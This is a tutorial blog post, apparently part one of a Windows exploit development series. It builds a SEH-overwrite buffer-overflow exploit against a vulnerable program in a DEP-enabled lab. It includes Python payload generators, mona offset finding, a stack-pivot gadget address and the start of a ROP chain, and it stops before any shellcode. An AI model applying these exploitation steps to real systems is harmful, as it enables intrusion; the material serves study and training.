I"d'<p>Hello world!</p>

<p>Before we getting start with the content, I would like to mentioned that this material is not meant for beginner. If you never done Windows Exploit Development before I suggest to start reading my old blog about breaking the code series(<a href="https://court-of-testing-analysing.blogspot.com/2019/11/breaking-code-exploit-development.html">link</a>) this will give a general idea on how to setup and conduct research on windows binary.</p>

<p>This post was inspired from the following <a href="https://www.exploit-db.com/exploits/46283">exploit-db</a>. You may notice later that I used different exploit to gain control of the program but the approach still the same with the original author.</p>

<h2> Setup Windows Lab </h2>

<p>In this lab I used Windows 7 from windows IE developer official (<a href="https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/">website</a>) and install several tools for exploit development in it, such as:</p>

<ul>
  <li>
    <p>Python 2.7</p>
  </li>
  <li>
    <p>Immunity Debugger</p>
  </li>
  <li>
    <p>Mona</p>
  </li>
  <li>
    <p>The vulnerable program, you can download it from the following <a href="https://www.exploit-db.com/exploits/46283">link</a></p>
  </li>
</ul>

<p>Note 1: DEP is set to always ON!</p>

<p style="text-align: center;"><img src="http://localhost:4000/blog/img/windows_exploit_dev_1/windows_exp1.png" alt="PLIST-FILE_3" /></p>

<p>DEP is stands for Data Execution Prevention. This security mechanism is used to make the stack area of program to be not executable, thus, this means if we try to put shellcode in the stack it will failed. To bypass this protection, we will use ROP(Return Oriented Programming) to reuse the code inside the program to call virtualprotect function in order to make the stack area executable again.</p>

<p>Note 2: Exploit offset calculation is based on the how long is the username of the windows machine, in this case my username is IEUser.</p>

<p>Note 3: To get accurate result when debugging the exploit, everytime the program crash you need to detach the immunity debugger, restart the program and attach it again. I know it’s a lot of work.</p>

<h2> Crash and Take Over the Program EIP </h2>

<p>First, we need to crash the program and take over the EIP register. This register is the one responsible to control the execution flow.</p>

<figure class="highlight"><pre><code class="language-py" data-lang="py"><span class="n">padding</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">2000</span>
<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"payload.txt"</span><span class="p">,</span><span class="s">"wb"</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
	<span class="nb">file</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">padding</span><span class="p">)</span>
	<span class="nb">file</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>

<span class="k">print</span> <span class="s">"[!] payload.txt ready to uploaded"</span></code></pre></figure>

<p>The following python code will generate a payload.txt file that will crash the program by overwritting the EIP register. Upload the file by go to the “computer” section and choose “From Text File”.</p>

<p style="text-align: center;"><img src="http://localhost:4000/blog/img/windows_exploit_dev_1/windows_exp2.png" alt="PLIST-FILE_3" /></p>

<p>Then go to the immunity debugger, you need to type “shift+f9” to jump the SEH exception to get the following result. If you having trouble to used this shortcut you can go to virtualbox options “input” &gt; “keyboard” &gt; “Soft Keyboard” to emulate this shortcut.</p>

<p style="text-align: center;"><img src="http://localhost:4000/blog/img/windows_exploit_dev_1/windows_exp3.png" alt="PLIST-FILE_3" height="300px" width="300px" /></p>

<p>At this stage, we need to know at what offset in our input to gain control of the EIP register, we will be using one of the mona features to generate pattern for the payload.</p>

<p style="text-align: center;"><img src="http://localhost:4000/blog/img/windows_exploit_dev_1/windows_exp4.png" alt="PLIST-FILE_3" /></p>

<p>To get the pattern you can go to immunity folder and look for pattern.txt file. Copied the content under ASCII section and update the previous python source code to used this payload.</p>

<p style="text-align: center;"><img src="http://localhost:4000/blog/img/windows_exploit_dev_1/windows_exp5.png" alt="PLIST-FILE_3" /></p>

<p style="text-align: center;"><img src="http://localhost:4000/blog/img/windows_exploit_dev_1/windows_exp6.png" alt="PLIST-FILE_3" /></p>

<p>Upload the new payload to the vulnerable program and don’t forgot to pass the exception using “shift+f9” shortcut. The EIP now is overwrite with the pattern, next we will use mona feature to get the exact location of our input to control the EIP.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">!</span>mona findmsp</code></pre></figure>

<p style="text-align: center;"><img src="http://localhost:4000/blog/img/windows_exploit_dev_1/windows_exp7.png" alt="PLIST-FILE_3" height="300px" width="300px" /></p>

<p style="text-align: center;"><img src="http://localhost:4000/blog/img/windows_exploit_dev_1/windows_exp8.png" alt="PLIST-FILE_3" /></p>

<p>Using the following command, we are able to identify the offset of our EIP which is 207. But how about the SEH exception? that would be not much of problem, why? if you look closely the SEH is located 4 bytes(211) after the EIP so all we need to do is to find a gadget that jump to the next 8 or more bytes in the stack so we will no get caught up in the SEH exception.</p>

<p>There are a lot of gadgets inside the program that can be used to satisfy the condition but because I’m lazy, I’m just going to used the one that suggested by the original author. It’s located at 0x10013e29 and it points to instructions:</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="nf">add</span> <span class="nb">ESP</span><span class="p">,</span><span class="mh">0xC</span>
<span class="nf">RETN</span></code></pre></figure>

<p>this instructions basically will increment the ESP value to 12 bytes, thus, this will jump the nSEH and SEH and make the execution return to the stack. Update the source code:</p>

<figure class="highlight"><pre><code class="language-py" data-lang="py"><span class="kn">import</span> <span class="nn">struct</span>

<span class="n">padding</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">207</span>
<span class="n">eip</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span><span class="mh">0x10013e29</span><span class="p">)</span>
<span class="n">junk</span> <span class="o">=</span> <span class="s">"B"</span> <span class="o">*</span> <span class="mi">12</span>
<span class="n">junk</span> <span class="o">+=</span> <span class="s">"C"</span> <span class="o">*</span> <span class="mi">1000</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">eip</span> <span class="o">+</span> <span class="n">junk</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"payload.txt"</span><span class="p">,</span><span class="s">"wb"</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
	<span class="nb">file</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
	<span class="nb">file</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>

<span class="k">print</span> <span class="s">"[!] payload.txt ready to uploaded"</span></code></pre></figure>

<p>Put breakpoint at 0x10013e29, so we know that the exploit is working. I suggest to use hardware breakpont in immunity debugger so you don’t have to put breakpoint multiple times. After that you can upload the new payload and pass the exception, at the end you will be end up at your breakpoint like below:</p>

<p style="text-align: center;"><img src="http://localhost:4000/blog/img/windows_exploit_dev_1/windows_exp9.png" alt="PLIST-FILE_3" /></p>

<p style="text-align: center;"><img src="http://localhost:4000/blog/img/windows_exploit_dev_1/windows_exp10.png" alt="PLIST-FILE_3" /></p>

<p>Continue the execution by click “step over” 2 times this will make the program jump next 10 bytes and return the execution to the stack, cool!</p>

<p style="text-align: center;"><img src="http://localhost:4000/blog/img/windows_exploit_dev_1/windows_exp11.png" alt="PLIST-FILE_3" height="300px" width="300px" /></p>

<h2> Constructing ROP Chain </h2>

<p>Now, it’s time to create the ROP Chain so we can reuse the instruction in the program and execute virtualprotect() function.</p>

<p>Some tips to create ROP Chain in windows, make sure to use gadgets that the following features is set to false:</p>

<ul>
  <li>
    <p>Rebase, although this is not security mechanism. This module will move instructions of used modules inside the program if there is conflicted address.</p>
  </li>
  <li>
    <p>ASLR, randomize the instructions of the library</p>
  </li>
</ul>

<p>You can check it using mona by using this command:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">!</span>mona modules</code></pre></figure>

<p style="text-align: center;"><img src="http://localhost:4000/blog/img/windows_exploit_dev_1/windows_exp12.png" alt="PLIST-FILE_3" height="300px" width="500px" /></p>

:ET